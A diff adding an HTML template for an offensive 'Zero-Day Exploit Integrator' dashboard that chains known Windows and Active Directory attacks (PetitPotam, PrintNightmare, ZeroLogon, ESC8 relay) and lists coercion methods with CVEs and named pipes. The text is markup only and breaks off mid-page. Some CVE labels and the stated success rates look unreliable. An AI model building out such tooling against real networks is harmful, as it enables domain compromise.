@@ -1,0 +1,2004 @@
+{% extends "base.html" %}
+{% block title %}Zero-Day Exploit Integrator{% endblock %}
+
+{% block extra_css %}
+<style>
+    :root {
+        --zd-critical: #dc2626;
+        --zd-high: #ea580c;
+        --zd-medium: #ca8a04;
+        --zd-low: #16a34a;
+        --zd-unknown: #6b7280;
+        --zd-accent: #8b5cf6;
+        --zd-glow: rgba(139, 92, 246, 0.5);
+    }
+
+    .zeroday-container {
+        max-width: 1800px;
+        margin: 0 auto;
+        padding: 20px;
+    }
+
+    .zd-header {
+        background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f0f23 100%);
+        border-radius: 16px;
+        padding: 30px;
+        margin-bottom: 25px;
+        position: relative;
+        overflow: hidden;
+        border: 1px solid rgba(139, 92, 246, 0.3);
+    }
+
+    .zd-header::before {
+        content: '';
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M54.627 0l.83.828-1.415 1.415L51.8 0h2.827zM5.373 0l-.83.828L5.96 2.243 8.2 0H5.374zM48.97 0l3.657 3.657-1.414 1.414L46.143 0h2.828zM11.03 0L7.372 3.657 8.787 5.07 13.857 0H11.03zm32.284 0L49.8 6.485 48.384 7.9l-7.9-7.9h2.83zM16.686 0L10.2 6.485 11.616 7.9l7.9-7.9h-2.83zM22.344 0L13.858 8.485 15.272 9.9l9.9-9.9h-2.83zM32 0l-3.486 3.485-1.414-1.414L30.172 0H32zM0 5.373l.828-.83 1.415 1.415L0 8.2V5.374zm0 5.656l.828-.829 5.07 5.07-1.414 1.415L0 11.03v-.001zm0 5.656l.828-.828 8.485 8.485-1.414 1.414L0 16.686v-.001zm0 5.657l.828-.828 11.9 11.9-1.414 1.414L0 22.343v-.001zm0 5.657l.828-.828 15.313 15.314-1.414 1.414L0 28v-.001z' fill='%238b5cf6' fill-opacity='0.03' fill-rule='evenodd'/%3E%3C/svg%3E");
+        pointer-events: none;
+    }
+
+    .zd-title {
+        font-size: 2.5rem;
+        font-weight: 700;
+        color: #fff;
+        margin-bottom: 10px;
+        display: flex;
+        align-items: center;
+        gap: 15px;
+    }
+
+    .zd-title i {
+        color: var(--zd-accent);
+        filter: drop-shadow(0 0 10px var(--zd-glow));
+    }
+
+    .zd-subtitle {
+        color: #9ca3af;
+        font-size: 1.1rem;
+    }
+
+    .stats-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+        gap: 20px;
+        margin-bottom: 25px;
+    }
+
+    .stat-card {
+        background: linear-gradient(145deg, #1e1e2e 0%, #252540 100%);
+        border-radius: 12px;
+        padding: 20px;
+        border: 1px solid rgba(255, 255, 255, 0.1);
+        transition: all 0.3s ease;
+    }
+
+    .stat-card:hover {
+        transform: translateY(-5px);
+        border-color: var(--zd-accent);
+        box-shadow: 0 10px 30px rgba(139, 92, 246, 0.2);
+    }
+
+    .stat-card.critical { border-left: 4px solid var(--zd-critical); }
+    .stat-card.high { border-left: 4px solid var(--zd-high); }
+    .stat-card.medium { border-left: 4px solid var(--zd-medium); }
+    .stat-card.low { border-left: 4px solid var(--zd-low); }
+
+    .stat-value {
+        font-size: 2rem;
+        font-weight: 700;
+        color: #fff;
+    }
+
+    .stat-label {
+        color: #9ca3af;
+        font-size: 0.9rem;
+        margin-top: 5px;
+    }
+
+    .main-grid {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 25px;
+        margin-bottom: 25px;
+    }
+
+    @media (max-width: 1200px) {
+        .main-grid { grid-template-columns: 1fr; }
+    }
+
+    .panel {
+        background: linear-gradient(145deg, #1e1e2e 0%, #252540 100%);
+        border-radius: 16px;
+        padding: 25px;
+        border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+
+    .panel-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 20px;
+        padding-bottom: 15px;
+        border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+    }
+
+    .panel-title {
+        font-size: 1.3rem;
+        font-weight: 600;
+        color: #fff;
+        display: flex;
+        align-items: center;
+        gap: 10px;
+    }
+
+    .panel-title i {
+        color: var(--zd-accent);
+    }
+
+    /* CVE Search Form */
+    .search-form {
+        display: flex;
+        gap: 15px;
+        flex-wrap: wrap;
+        margin-bottom: 20px;
+    }
+
+    .search-input {
+        flex: 1;
+        min-width: 200px;
+        padding: 12px 16px;
+        border-radius: 8px;
+        border: 1px solid rgba(255, 255, 255, 0.2);
+        background: rgba(0, 0, 0, 0.3);
+        color: #fff;
+        font-size: 1rem;
+        transition: all 0.3s ease;
+    }
+
+    .search-input:focus {
+        outline: none;
+        border-color: var(--zd-accent);
+        box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.2);
+    }
+
+    .search-input::placeholder {
+        color: #6b7280;
+    }
+
+    .search-select {
+        padding: 12px 16px;
+        border-radius: 8px;
+        border: 1px solid rgba(255, 255, 255, 0.2);
+        background: rgba(0, 0, 0, 0.3);
+        color: #fff;
+        font-size: 1rem;
+        min-width: 150px;
+        cursor: pointer;
+    }
+
+    .search-select option {
+        background: #1e1e2e;
+        color: #fff;
+    }
+
+    .btn {
+        padding: 12px 24px;
+        border-radius: 8px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        border: none;
+        display: inline-flex;
+        align-items: center;
+        gap: 8px;
+    }
+
+    .btn-primary {
+        background: linear-gradient(135deg, var(--zd-accent), #7c3aed);
+        color: #fff;
+    }
+
+    .btn-primary:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 5px 20px rgba(139, 92, 246, 0.4);
+    }
+
+    .btn-danger {
+        background: linear-gradient(135deg, var(--zd-critical), #b91c1c);
+        color: #fff;
+    }
+
+    .btn-success {
+        background: linear-gradient(135deg, var(--zd-low), #15803d);
+        color: #fff;
+    }
+
+    .btn-warning {
+        background: linear-gradient(135deg, var(--zd-high), #c2410c);
+        color: #fff;
+    }
+
+    /* CVE Results List */
+    .cve-list {
+        max-height: 500px;
+        overflow-y: auto;
+    }
+
+    .cve-item {
+        background: rgba(0, 0, 0, 0.2);
+        border-radius: 10px;
+        padding: 15px;
+        margin-bottom: 10px;
+        border: 1px solid rgba(255, 255, 255, 0.1);
+        transition: all 0.3s ease;
+        cursor: pointer;
+    }
+
+    .cve-item:hover {
+        border-color: var(--zd-accent);
+        background: rgba(139, 92, 246, 0.1);
+    }
+
+    .cve-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 10px;
+    }
+
+    .cve-id {
+        font-weight: 700;
+        font-size: 1.1rem;
+        color: var(--zd-accent);
+    }
+
+    .severity-badge {
+        padding: 4px 12px;
+        border-radius: 20px;
+        font-size: 0.75rem;
+        font-weight: 600;
+        text-transform: uppercase;
+    }
+
+    .severity-critical { background: var(--zd-critical); color: #fff; }
+    .severity-high { background: var(--zd-high); color: #fff; }
+    .severity-medium { background: var(--zd-medium); color: #fff; }
+    .severity-low { background: var(--zd-low); color: #fff; }
+    .severity-unknown { background: var(--zd-unknown); color: #fff; }
+
+    .cve-description {
+        color: #d1d5db;
+        font-size: 0.9rem;
+        line-height: 1.5;
+        margin-bottom: 10px;
+    }
+
+    .cve-meta {
+        display: flex;
+        gap: 15px;
+        flex-wrap: wrap;
+        font-size: 0.85rem;
+    }
+
+    .cve-meta-item {
+        color: #9ca3af;
+        display: flex;
+        align-items: center;
+        gap: 5px;
+    }
+
+    .cve-meta-item i {
+        color: var(--zd-accent);
+    }
+
+    /* Risk Score Meter */
+    .risk-meter {
+        background: rgba(0, 0, 0, 0.3);
+        border-radius: 10px;
+        padding: 20px;
+        margin-bottom: 20px;
+    }
+
+    .risk-score-display {
+        display: flex;
+        align-items: center;
+        gap: 20px;
+    }
+
+    .risk-circle {
+        width: 100px;
+        height: 100px;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 2rem;
+        font-weight: 700;
+        color: #fff;
+        position: relative;
+    }
+
+    .risk-circle::before {
+        content: '';
+        position: absolute;
+        inset: -5px;
+        border-radius: 50%;
+        padding: 5px;
+        background: conic-gradient(from 0deg, var(--zd-critical), var(--zd-high), var(--zd-medium), var(--zd-low));
+        -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+        mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+        -webkit-mask-composite: xor;
+        mask-composite: exclude;
+        animation: rotate 10s linear infinite;
+    }
+
+    @keyframes rotate {
+        100% { transform: rotate(360deg); }
+    }
+
+    .risk-details {
+        flex: 1;
+    }
+
+    .risk-factors {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+        gap: 10px;
+    }
+
+    .risk-factor {
+        display: flex;
+        flex-direction: column;
+        gap: 5px;
+    }
+
+    .risk-factor-label {
+        font-size: 0.8rem;
+        color: #9ca3af;
+    }
+
+    .risk-factor-bar {
+        height: 6px;
+        background: rgba(255, 255, 255, 0.1);
+        border-radius: 3px;
+        overflow: hidden;
+    }
+
+    .risk-factor-fill {
+        height: 100%;
+        border-radius: 3px;
+        transition: width 0.5s ease;
+    }
+
+    /* Exploit Chain Builder */
+    .chain-builder {
+        background: rgba(0, 0, 0, 0.2);
+        border-radius: 12px;
+        padding: 20px;
+    }
+
+    .chain-templates {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+        gap: 15px;
+        margin-bottom: 20px;
+    }
+
+    .chain-template {
+        background: rgba(0, 0, 0, 0.3);
+        border-radius: 10px;
+        padding: 15px;
+        border: 2px solid transparent;
+        cursor: pointer;
+        transition: all 0.3s ease;
+    }
+
+    .chain-template:hover {
+        border-color: var(--zd-accent);
+        transform: scale(1.02);
+    }
+
+    .chain-template.selected {
+        border-color: var(--zd-accent);
+        background: rgba(139, 92, 246, 0.2);
+    }
+
+    .chain-template-name {
+        font-weight: 600;
+        color: #fff;
+        margin-bottom: 5px;
+    }
+
+    .chain-template-desc {
+        font-size: 0.85rem;
+        color: #9ca3af;
+    }
+
+    .chain-success {
+        margin-top: 8px;
+        font-size: 0.8rem;
+        color: var(--zd-low);
+    }
+
+    /* Chain Visualization */
+    .chain-visual {
+        background: rgba(0, 0, 0, 0.3);
+        border-radius: 10px;
+        padding: 20px;
+        margin-top: 20px;
+    }
+
+    .chain-steps {
+        display: flex;
+        flex-direction: column;
+        gap: 15px;
+    }
+
+    .chain-step {
+        display: flex;
+        align-items: center;
+        gap: 15px;
+        position: relative;
+    }
+
+    .chain-step::after {
+        content: '';
+        position: absolute;
+        left: 19px;
+        top: 40px;
+        width: 2px;
+        height: calc(100% + 15px);
+        background: linear-gradient(to bottom, var(--zd-accent), transparent);
+    }
+
+    .chain-step:last-child::after {
+        display: none;
+    }
+
+    .step-number {
+        width: 40px;
+        height: 40px;
+        border-radius: 50%;
+        background: var(--zd-accent);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-weight: 700;
+        color: #fff;
+        flex-shrink: 0;
+        z-index: 1;
+    }
+
+    .step-content {
+        flex: 1;
+        background: rgba(255, 255, 255, 0.05);
+        border-radius: 8px;
+        padding: 12px 15px;
+        border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+
+    .step-action {
+        font-weight: 600;
+        color: var(--zd-accent);
+        font-size: 0.85rem;
+        text-transform: uppercase;
+        margin-bottom: 3px;
+    }
+
+    .step-description {
+        color: #d1d5db;
+        font-size: 0.95rem;
+    }
+
+    .step-tool {
+        color: #9ca3af;
+        font-size: 0.8rem;
+        margin-top: 5px;
+    }
+
+    /* Coercion Methods */
+    .coercion-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+        gap: 15px;
+    }
+
+    .coercion-card {
+        background: rgba(0, 0, 0, 0.3);
+        border-radius: 10px;
+        padding: 15px;
+        border: 1px solid rgba(255, 255, 255, 0.1);
+        transition: all 0.3s ease;
+    }
+
+    .coercion-card:hover {
+        border-color: var(--zd-accent);
+        box-shadow: 0 5px 20px rgba(139, 92, 246, 0.2);
+    }
+
+    .coercion-name {
+        font-weight: 600;
+        color: #fff;
+        margin-bottom: 5px;
+        display: flex;
+        align-items: center;
+        gap: 8px;
+    }
+
+    .coercion-cve {
+        font-size: 0.8rem;
+        color: var(--zd-accent);
+        margin-bottom: 8px;
+    }
+
+    .coercion-meta {
+        font-size: 0.8rem;
+        color: #9ca3af;
+    }
+
+    .coercion-auth {
+        display: inline-block;
+        padding: 2px 8px;
+        border-radius: 10px;
+        font-size: 0.7rem;
+        margin-top: 5px;
+    }
+
+    .coercion-auth.no-auth {
+        background: var(--zd-critical);
+        color: #fff;
+    }
+
+    .coercion-auth.requires-auth {
+        background: var(--zd-medium);
+        color: #fff;
+    }
+
+    /* Relay Integration Panel */
+    .relay-config {
+        background: rgba(0, 0, 0, 0.2);
+        border-radius: 10px;
+        padding: 20px;
+    }
+
+    .relay-form {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 15px;
+    }
+
+    .relay-form .form-group {
+        display: flex;
+        flex-direction: column;
+        gap: 5px;
+    }
+
+    .relay-form label {
+        font-size: 0.9rem;
+        color: #d1d5db;
+    }
+
+    .relay-target-select {
+        background: rgba(0, 0, 0, 0.3);
+        border: 1px solid rgba(255, 255, 255, 0.2);
+        border-radius: 8px;
+        padding: 10px 15px;
+        color: #fff;
+    }
+
+    /* Monitoring Status */
+    .monitor-status {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        margin-bottom: 15px;
+    }
+
+    .status-indicator {
+        width: 12px;
+        height: 12px;
+        border-radius: 50%;
+        background: var(--zd-low);
+        animation: pulse 2s infinite;
+    }
+
+    .status-indicator.inactive {
+        background: var(--zd-unknown);
+        animation: none;
+    }
+
+    @keyframes pulse {
+        0%, 100% { opacity: 1; }
+        50% { opacity: 0.5; }
+    }
+
+    /* Recent CVE Alerts */
+    .alert-list {
+        max-height: 400px;
+        overflow-y: auto;
+    }
+
+    .alert-item {
+        display: flex;
+        align-items: center;
+        gap: 15px;
+        padding: 12px;
+        background: rgba(0, 0, 0, 0.2);
+        border-radius: 8px;
+        margin-bottom: 8px;
+        border-left: 3px solid var(--zd-critical);
+    }
+
+    .alert-item.high { border-left-color: var(--zd-high); }
+    .alert-item.medium { border-left-color: var(--zd-medium); }
+
+    .alert-icon {
+        font-size: 1.5rem;
+    }
+
+    .alert-content {
+        flex: 1;
+    }
+
+    .alert-title {
+        font-weight: 600;
+        color: #fff;
+        margin-bottom: 3px;
+    }
+
+    .alert-time {
+        font-size: 0.8rem;
+        color: #9ca3af;
+    }
+
+    /* Code Output */
+    .code-output {
+        background: #0d1117;
+        border-radius: 8px;
+        padding: 15px;
+        margin-top: 15px;
+        position: relative;
+        font-family: 'JetBrains Mono', 'Fira Code', monospace;
+    }
+
+    .code-output pre {
+        margin: 0;
+        color: #c9d1d9;
+        font-size: 0.85rem;
+        line-height: 1.6;
+        overflow-x: auto;
+    }
+
+    .copy-btn {
+        position: absolute;
+        top: 10px;
+        right: 10px;
+        background: rgba(255, 255, 255, 0.1);
+        border: none;
+        color: #9ca3af;
+        padding: 5px 10px;
+        border-radius: 5px;
+        cursor: pointer;
+        transition: all 0.3s ease;
+    }
+
+    .copy-btn:hover {
+        background: var(--zd-accent);
+        color: #fff;
+    }
+
+    /* Loading Spinner */
+    .spinner {
+        width: 40px;
+        height: 40px;
+        border: 3px solid rgba(139, 92, 246, 0.3);
+        border-radius: 50%;
+        border-top-color: var(--zd-accent);
+        animation: spin 1s ease-in-out infinite;
+        margin: 20px auto;
+    }
+
+    @keyframes spin {
+        to { transform: rotate(360deg); }
+    }
+
+    /* Toast Notification */
+    .toast {
+        position: fixed;
+        bottom: 30px;
+        right: 30px;
+        padding: 15px 25px;
+        background: linear-gradient(145deg, #1e1e2e 0%, #252540 100%);
+        border: 1px solid var(--zd-accent);
+        border-radius: 10px;
+        color: #fff;
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
+        transform: translateX(150%);
+        transition: transform 0.3s ease;
+        z-index: 1000;
+    }
+
+    .toast.show {
+        transform: translateX(0);
+    }
+
+    .toast.success { border-color: var(--zd-low); }
+    .toast.error { border-color: var(--zd-critical); }
+
+    /* Full Width Section */
+    .full-width-section {
+        margin-bottom: 25px;
+    }
+
+    /* Tabs */
+    .tabs {
+        display: flex;
+        gap: 5px;
+        margin-bottom: 20px;
+        border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        padding-bottom: 10px;
+    }
+
+    .tab {
+        padding: 10px 20px;
+        background: transparent;
+        border: none;
+        color: #9ca3af;
+        cursor: pointer;
+        border-radius: 8px 8px 0 0;
+        transition: all 0.3s ease;
+    }
+
+    .tab:hover {
+        color: #fff;
+        background: rgba(255, 255, 255, 0.05);
+    }
+
+    .tab.active {
+        color: #fff;
+        background: var(--zd-accent);
+    }
+
+    .tab-content {
+        display: none;
+    }
+
+    .tab-content.active {
+        display: block;
+    }
+
+    /* Table */
+    .data-table {
+        width: 100%;
+        border-collapse: collapse;
+    }
+
+    .data-table th,
+    .data-table td {
+        padding: 12px 15px;
+        text-align: left;
+        border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+    }
+
+    .data-table th {
+        color: #9ca3af;
+        font-weight: 600;
+        font-size: 0.85rem;
+        text-transform: uppercase;
+    }
+
+    .data-table td {
+        color: #d1d5db;
+    }
+
+    .data-table tr:hover td {
+        background: rgba(255, 255, 255, 0.05);
+    }
+
+    /* Scrollbar */
+    ::-webkit-scrollbar {
+        width: 8px;
+    }
+
+    ::-webkit-scrollbar-track {
+        background: rgba(0, 0, 0, 0.3);
+        border-radius: 4px;
+    }
+
+    ::-webkit-scrollbar-thumb {
+        background: var(--zd-accent);
+        border-radius: 4px;
+    }
+
+    ::-webkit-scrollbar-thumb:hover {
+        background: #9f7aea;
+    }
+</style>
+{% endblock %}
+
+{% block content %}
+<div class="zeroday-container">
+    <!-- Header -->
+    <div class="zd-header">
+        <h1 class="zd-title">
+            <i class="fas fa-bug"></i>
+            Zero-Day Exploit Integrator
+        </h1>
+        <p class="zd-subtitle">Real-time CVE monitoring, AI-powered risk scoring, and automated exploit chain generation</p>
+    </div>
+
+    <!-- Stats Grid -->
+    <div class="stats-grid">
+        <div class="stat-card critical">
+            <div class="stat-value" id="criticalCount">0</div>
+            <div class="stat-label">Critical CVEs</div>
+        </div>
+        <div class="stat-card high">
+            <div class="stat-value" id="highCount">0</div>
+            <div class="stat-label">High Severity</div>
+        </div>
+        <div class="stat-card medium">
+            <div class="stat-value" id="mediumCount">0</div>
+            <div class="stat-label">Medium Severity</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-value" id="chainsGenerated">0</div>
+            <div class="stat-label">Chains Generated</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-value" id="monitored">24/7</div>
+            <div class="stat-label">Monitoring Active</div>
+        </div>
+    </div>
+
+    <!-- Main Grid -->
+    <div class="main-grid">
+        <!-- CVE Search Panel -->
+        <div class="panel">
+            <div class="panel-header">
+                <h2 class="panel-title">
+                    <i class="fas fa-search"></i>
+                    CVE Database Search
+                </h2>
+            </div>
+
+            <form class="search-form" id="cveSearchForm">
+                <input type="text" class="search-input" id="cveQuery" placeholder="CVE-2021-34527 or keyword..." autocomplete="off">
+                <select class="search-select" id="severityFilter">
+                    <option value="">All Severities</option>
+                    <option value="CRITICAL">Critical</option>
+                    <option value="HIGH">High</option>
+                    <option value="MEDIUM">Medium</option>
+                    <option value="LOW">Low</option>
+                </select>
+                <select class="search-select" id="vendorFilter">
+                    <option value="">All Vendors</option>
+                    <option value="microsoft">Microsoft</option>
+                    <option value="linux">Linux</option>
+                    <option value="cisco">Cisco</option>
+                    <option value="vmware">VMware</option>
+                    <option value="fortinet">Fortinet</option>
+                    <option value="citrix">Citrix</option>
+                    <option value="apache">Apache</option>
+                    <option value="oracle">Oracle</option>
+                </select>
+                <button type="submit" class="btn btn-primary">
+                    <i class="fas fa-search"></i> Search NVD
+                </button>
+            </form>
+
+            <div class="cve-list" id="cveResults">
+                <div style="text-align: center; padding: 40px; color: #9ca3af;">
+                    <i class="fas fa-database" style="font-size: 3rem; margin-bottom: 15px; display: block; color: var(--zd-accent);"></i>
+                    Search the NVD database for CVEs
+                </div>
+            </div>
+        </div>
+
+        <!-- AI Risk Analysis Panel -->
+        <div class="panel">
+            <div class="panel-header">
+                <h2 class="panel-title">
+                    <i class="fas fa-brain"></i>
+                    AI Risk Analysis
+                </h2>
+            </div>
+
+            <div class="risk-meter" id="riskMeter" style="display: none;">
+                <div class="risk-score-display">
+                    <div class="risk-circle" id="riskScore">0</div>
+                    <div class="risk-details">
+                        <h4 style="color: #fff; margin-bottom: 10px;" id="selectedCVE">No CVE Selected</h4>
+                        <div class="risk-factors">
+                            <div class="risk-factor">
+                                <span class="risk-factor-label">CVSS Score</span>
+                                <div class="risk-factor-bar">
+                                    <div class="risk-factor-fill" id="cvssBar" style="width: 0%; background: var(--zd-critical);"></div>
+                                </div>
+                            </div>
+                            <div class="risk-factor">
+                                <span class="risk-factor-label">Exploitability</span>
+                                <div class="risk-factor-bar">
+                                    <div class="risk-factor-fill" id="exploitBar" style="width: 0%; background: var(--zd-high);"></div>
+                                </div>
+                            </div>
+                            <div class="risk-factor">
+                                <span class="risk-factor-label">Impact</span>
+                                <div class="risk-factor-bar">
+                                    <div class="risk-factor-fill" id="impactBar" style="width: 0%; background: var(--zd-medium);"></div>
+                                </div>
+                            </div>
+                            <div class="risk-factor">
+                                <span class="risk-factor-label">Vendor Critical</span>
+                                <div class="risk-factor-bar">
+                                    <div class="risk-factor-fill" id="vendorBar" style="width: 0%; background: var(--zd-accent);"></div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div id="riskPlaceholder" style="text-align: center; padding: 40px; color: #9ca3af;">
+                <i class="fas fa-chart-line" style="font-size: 3rem; margin-bottom: 15px; display: block; color: var(--zd-accent);"></i>
+                Select a CVE to analyze risk
+            </div>
+
+            <div style="margin-top: 20px;">
+                <button class="btn btn-primary" id="generateChainBtn" disabled>
+                    <i class="fas fa-link"></i> Generate Exploit Chain
+                </button>
+                <button class="btn btn-warning" id="integrateRelayBtn" disabled>
+                    <i class="fas fa-network-wired"></i> Integrate to Relay Ninja
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Exploit Chain Builder -->
+    <div class="panel full-width-section">
+        <div class="panel-header">
+            <h2 class="panel-title">
+                <i class="fas fa-link"></i>
+                Exploit Chain Builder
+            </h2>
+            <div class="monitor-status">
+                <span class="status-indicator"></span>
+                <span style="color: #9ca3af;">Auto-chain enabled</span>
+            </div>
+        </div>
+
+        <div class="tabs">
+            <button class="tab active" data-tab="templates">Chain Templates</button>
+            <button class="tab" data-tab="custom">Custom Chain</button>
+            <button class="tab" data-tab="generated">Generated Chains</button>
+        </div>
+
+        <div class="tab-content active" id="templates">
+            <div class="chain-templates">
+                <div class="chain-template" data-chain="printer_to_domain">
+                    <div class="chain-template-name">
+                        <i class="fas fa-print"></i> Printer to Domain Admin
+                    </div>
+                    <div class="chain-template-desc">PrintNightmare → ADCS ESC8 → Domain Compromise</div>
+                    <div class="chain-success">
+                        <i class="fas fa-check-circle"></i> 85% Success Rate
+                    </div>
+                </div>
+                <div class="chain-template" data-chain="petitpotam_esc8">
+                    <div class="chain-template-name">
+                        <i class="fas fa-file-alt"></i> PetitPotam ESC8
+                    </div>
+                    <div class="chain-template-desc">EFS Coercion → Web Enrollment → DCSync</div>
+                    <div class="chain-success">
+                        <i class="fas fa-check-circle"></i> 90% Success Rate
+                    </div>
+                </div>
+                <div class="chain-template" data-chain="zerologon">
+                    <div class="chain-template-name">
+                        <i class="fas fa-shield-alt"></i> ZeroLogon Chain
+                    </div>
+                    <div class="chain-template-desc">Reset DC Password → Secrets Dump → Restore</div>
+                    <div class="chain-success">
+                        <i class="fas fa-check-circle"></i> 95% Success Rate
+                    </div>
+                </div>
+                <div class="chain-template" data-chain="proxylogon">
+                    <div class="chain-template-name">
+                        <i class="fas fa-envelope"></i> ProxyLogon Chain
+                    </div>
+                    <div class="chain-template-desc">Exchange SSRF → Webshell → Domain Pivot</div>
+                    <div class="chain-success">
+                        <i class="fas fa-check-circle"></i> 80% Success Rate
+                    </div>
+                </div>
+                <div class="chain-template" data-chain="log4shell">
+                    <div class="chain-template-name">
+                        <i class="fab fa-java"></i> Log4Shell Chain
+                    </div>
+                    <div class="chain-template-desc">JNDI Injection → RCE → Persistence</div>
+                    <div class="chain-success">
+                        <i class="fas fa-check-circle"></i> 75% Success Rate
+                    </div>
+                </div>
+            </div>
+
+            <div class="chain-visual" id="chainVisual" style="display: none;">
+                <h4 style="color: #fff; margin-bottom: 15px;">
+                    <i class="fas fa-sitemap" style="color: var(--zd-accent);"></i>
+                    Chain Steps
+                </h4>
+                <div class="chain-steps" id="chainSteps">
+                    <!-- Steps will be populated dynamically -->
+                </div>
+            </div>
+        </div>
+
+        <div class="tab-content" id="custom">
+            <div class="relay-config">
+                <h4 style="color: #fff; margin-bottom: 15px;">Build Custom Exploit Chain</h4>
+                <div class="relay-form">
+                    <div class="form-group">
+                        <label>Target Type</label>
+                        <select class="relay-target-select" id="customTargetType">
+                            <option value="active_directory">Active Directory</option>
+                            <option value="exchange">Microsoft Exchange</option>
+                            <option value="web_application">Web Application</option>
+                            <option value="network_device">Network Device</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label>Initial Access CVE</label>
+                        <input type="text" class="search-input" id="initialCVE" placeholder="CVE-2021-XXXXX">
+                    </div>
+                    <div class="form-group">
+                        <label>Coercion Method</label>
+                        <select class="relay-target-select" id="customCoercion">
+                            <option value="petitpotam">PetitPotam (No Auth)</option>
+                            <option value="printnightmare">PrintNightmare</option>
+                            <option value="printerbug">PrinterBug</option>
+                            <option value="shadowcoerce">ShadowCoerce</option>
+                            <option value="dfscoerce">DFSCoerce</option>
+                            <option value="coercer">Coercer (Multi)</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label>Relay Target</label>
+                        <select class="relay-target-select" id="customRelayTarget">
+                            <option value="ldap">LDAP (RBCD)</option>
+                            <option value="adcs">ADCS (ESC8)</option>
+                            <option value="http">HTTP (SMB Signing Disabled)</option>
+                            <option value="smb">SMB Relay</option>
+                        </select>
+                    </div>
+                </div>
+                <button class="btn btn-primary" style="margin-top: 15px;" id="buildCustomChain">
+                    <i class="fas fa-hammer"></i> Build Chain
+                </button>
+            </div>
+        </div>
+
+        <div class="tab-content" id="generated">
+            <div id="generatedChainsList">
+                <div style="text-align: center; padding: 40px; color: #9ca3af;">
+                    <i class="fas fa-code-branch" style="font-size: 3rem; margin-bottom: 15px; display: block; color: var(--zd-accent);"></i>
+                    No chains generated yet. Select a template or build a custom chain.
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Coercion Methods & Relay Integration -->
+    <div class="main-grid">
+        <!-- Coercion Methods -->
+        <div class="panel">
+            <div class="panel-header">
+                <h2 class="panel-title">
+                    <i class="fas fa-broadcast-tower"></i>
+                    Coercion Methods
+                </h2>
+            </div>
+
+            <div class="coercion-grid">
+                <div class="coercion-card">
+                    <div class="coercion-name">
+                        <i class="fas fa-print"></i> PrintNightmare
+                    </div>
+                    <div class="coercion-cve">CVE-2021-34527</div>
+                    <div class="coercion-meta">Port: 445 | Pipe: spoolss</div>
+                    <span class="coercion-auth no-auth">No Auth Required</span>
+                </div>
+                <div class="coercion-card">
+                    <div class="coercion-name">
+                        <i class="fas fa-file-alt"></i> PetitPotam
+                    </div>
+                    <div class="coercion-cve">CVE-2021-36942</div>
+                    <div class="coercion-meta">Port: 445 | Pipe: efsrpc</div>
+                    <span class="coercion-auth no-auth">No Auth Required</span>
+                </div>
+                <div class="coercion-card">
+                    <div class="coercion-name">
+                        <i class="fas fa-print"></i> PrinterBug
+                    </div>
+                    <div class="coercion-cve">CVE-2021-1675</div>
+                    <div class="coercion-meta">Port: 445 | Pipe: spoolss</div>
+                    <span class="coercion-auth requires-auth">Auth Required</span>
+                </div>
+                <div class="coercion-card">
+                    <div class="coercion-name">
+                        <i class="fas fa-copy"></i> ShadowCoerce
+                    </div>
+                    <div class="coercion-cve">CVE-2022-30213</div>
+                    <div class="coercion-meta">Port: 445 | Pipe: FssagentRpc</div>
+                    <span class="coercion-auth requires-auth">Auth Required</span>
+                </div>
+                <div class="coercion-card">
+                    <div class="coercion-name">
+                        <i class="fas fa-folder-tree"></i> DFSCoerce
+                    </div>
+                    <div class="coercion-cve">CVE-2022-26925</div>
+                    <div class="coercion-meta">Port: 445 | Pipe: netdfs</div>
+                    <span class="coercion-auth requires-auth">Auth Required</span>
+                </div>
+                <div class="coercion-card">
+                    <div class="coercion-name">
+                        <i class="fas fa-network-wired"></i> Coercer
+                    </div>
+                    <div class="coercion-cve">Multiple CVEs</div>
+                    <div class="coercion-meta">Multi-pipe scanner</div>
+                    <span class="coercion-auth no-auth">Mixed</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Recent CVE Alerts -->
+        <div class="panel">
+            <div class="panel-header">
+                <h2 class="panel-title">
+                    <i class="fas fa-bell"></i>
+                    Recent CVE Alerts
+                </h2>
+                <div class="monitor-status">
+                    <span class="status-indicator" id="monitorIndicator"></span>
+                    <span style="color: #9ca3af;" id="monitorStatus">Monitoring Active</span>
+                </div>
+            </div>
+
+            <div class="alert-list" id="alertList">
+                <div class="alert-item">
+                    <span class="alert-icon">🚨</span>
+                    <div class="alert-content">
